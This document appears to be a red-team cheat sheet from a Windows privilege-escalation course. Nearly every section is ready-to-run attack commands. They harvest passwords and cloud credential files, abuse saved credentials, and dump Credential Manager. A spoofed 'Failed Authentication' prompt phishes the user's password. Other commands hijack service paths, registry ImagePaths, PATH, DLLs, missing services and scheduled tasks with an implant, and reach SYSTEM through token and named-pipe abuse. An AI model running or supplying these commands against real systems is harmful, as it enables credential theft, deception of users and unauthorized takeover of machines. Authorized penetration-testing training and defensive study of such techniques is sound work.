# RTO Sektor7 Cheat Sheet

### Credentials

- Search for passwords

```
C:\> dir /b /a /s c:\ > c:\rto\c-dirs.txt
C:\> type c:\rto\c-dirs.txt | findstr /i passw
```

- Search for interesting files

```
C:\> type c:\rto\c-dirs.txt | findstr /i ssh
C:\> type c:\rto\c-dirs.txt | findstr /i kdbx
C:\> type c:\rto\c-dirs.txt | findstr /i vnc
```

- Good targets:

  - install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, id_dsa, .ovpn, .rdp, vnc, ftp, ssh, vpn, git, .kdbx, .db
  - unattend.xml
  - Unattended.xml
  - sysprep.inf
  - sysprep.xml
  - VARIABLES.DAT
  - setupinfo
  - setupinfo.bak
  - web.config
  - SiteList.xml
  - .aws\credentials
  - .azure\accessTokens.json
  - .azure\azureProfile.json
  - gcloud\credentials.db
  - gcloud\legacy_credentials
  - gcloud\access_tokens.db
 
- Search for passwords in the Registry

```
C:\> reg query "HKCU\Software\ORL\WinVNC3\Password"
C:\> reg query "HKCU\Software\TightVNC\Server"
C:\> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
C:\> reg query "HKCU\Software\OpenSSH\Agent\Keys"
C:\> reg query HKLM /f password /t REG_SZ /s
C:\> reg query HKCU /f password /t REG_SZ /s
```

- Abuse Credential Manager to run a application as another user using saved credentials

```
C:\> cmdkey /list
C:\> runas /savecred /user:admin cmd.exe
C:\> runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
C:\> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt"
```

- Rob Credential Manager using a custom script based on https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1

```
C:\> powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds
```

- Ask user for credentials using a trick prompt

```
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

### Unsecured Objects

- Search for unquoted service paths

```
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """"
```

- Search for services with weak permissions

```
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Everyone" *
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Users" *
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Authenticated Users" *

C:\> sc query sshd
C:\> sc qc sshd
C:\> sc config sshd binPath= "c:\rto\lpe\implant\implant.exe"
C:\> sc start sshd

C:\> sc stop sshd
C:\> sc config sshd binPath= "c:\Program Files\OpenSSH\sshd.exe"
```

- Search for service Registry keys with weak permissions

```
C:\> c:\RTO\Tools\SI\accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > c:\rto\regs.txt

C:\> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT
C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d C:\rto\lpe\implant\implantsrv.exe /f
C:\> sc stop ikeext
C:\> sc start ikeext

C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
```

### Execution Flow Hijacking

- Search for files with weak permissions that we can replace with backdoored versions e.g. Putty.exe

```
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wus "Users" c:\*.* > c:\rto\fld-usr.txt
C:\> c:\rto\tools\si\accesschk.exe -accepteula -wus "Authenticated Users" c:\*.* > c:\rto\fld-authusr.txt
```

- Exploit the PATH variable

```
C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
C:\> icacls c:\rto\bin
C:\> copy c:\windows\system32\cmd.exe c:\rto\bin\notepad.exe

C:\> del c:\rto\bin\notepad.exe
```

- Exploit a missing service

```
C:\> c:\RTO\Tools\si\autorunsc64.exe -a s | more
C:\> sc query AdobeUpdate
C:\> sc qc AdobeUpdate
C:\> copy c:\RTO\LPE\implant\implantsrv.exe c:\rto\bin\AdobeUpdate.exe

C:\> sc stop AdobeUpdate
C:\> sc start AdobeUpdate

C:\> del c:\rto\bin\AdobeUpdate.exe
```

- Exploit a missing scheduled task

```
C:\> c:\RTO\Tools\si\autorunsc64.exe -a t | more
C:\> schtasks /query /tn OneDriveChk /xml

C:\> wmic useraccount where sid='S-1-5-21-3461203602-4096304019-2269080069-1003' get name

C:\> copy c:\RTO\LPE\implant\implant.exe C:\RTO\bin\OneDriveChk.exe

C:\> del C:\RTO\bin\OneDriveChk.exe
```

- Hijack a DLL

```
C:\> cd c:\RTO\LPE\DLL-hijack
C:\> compile.bat
C:\> copy c:\RTO\LPE\DLL-hijack\winmm.dll c:\RTO\Tools\putty\

C:\> del c:\RTO\Tools\putty\winmm.dll
```

- Bypass UAC

```
Repo with up-to-date UAC bypass exploits:
https://github.com/hfiref0x/UACME
```

### Getting SYSTEM

- Search for AlwaysInstallElevated MSI setting

```
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- Create a new service for SYSTEM

```
run from elevated admin cmd/console:
C:\> sc create lol binPath= "c:\RTO\LPE\implant\implant.exe"
C:\> sc start lol
C:\> sc stop lol
C:\> sc delete lol
```

- Abuse tokens

```
C:\> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT
C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d c:\RTO\LPE\2SYSTEM\TokenDance\tokendance.exe /f

C:\> sc stop ikeext
C:\> sc start ikeext

C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
```

- Exploit named pipes

```
C:\> cd \RTO\LPE\2SYSTEM\Piper
C:\> compile.bat

run from elevated admin cmd/console:
C:\> cd \RTO\LPE\2SYSTEM\Piper
C:\> piper.exe
```
